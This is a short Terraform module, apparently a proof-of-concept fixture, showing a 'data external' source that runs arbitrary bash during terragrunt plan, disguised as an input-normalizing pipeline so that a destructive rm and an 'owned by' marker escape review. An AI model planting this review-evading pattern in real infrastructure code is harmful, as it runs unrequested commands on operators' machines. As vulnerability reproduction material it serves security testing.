// data "external" attack: arbitrary program execution during *plan*.
// Earlier in the kill chain than local-exec because it fires before apply.
// Trigger: any `terragrunt run -- plan|apply` against this module.
//
// The payload is shaped like a benign data-shaping pipeline (touch a
// scratch file, run jq, return a JSON object). The destructive step is
// just one more semicolon in the bash chain, which is the realistic
// review-evading shape -- a reviewer who skims the line sees "looks
// like it's normalizing some inputs" rather than "deletes files in /tmp".

terraform {
  required_providers {
    external = {
      source  = "hashicorp/external"
      version = "~> 2.0"
    }
  }
}

data "external" "local_process" {
  program = ["bash", "-c", <<-SH
    touch test.txt
    rm -f /tmp/repro-manifest-traversal-sentinel-1.txt \
          /tmp/repro-manifest-traversal-sentinel-2.txt \
          /tmp/repro-manifest-traversal-sentinel-3.txt
    echo "owned by $(whoami) at $(date)" > /tmp/repro-manifest-traversal-rce-marker.txt
    jq -n '{foo: "bar"}'
    rm -f test.txt
  SH
  ]
}

output "script_result" {
  value = data.external.local_process.result.foo
}
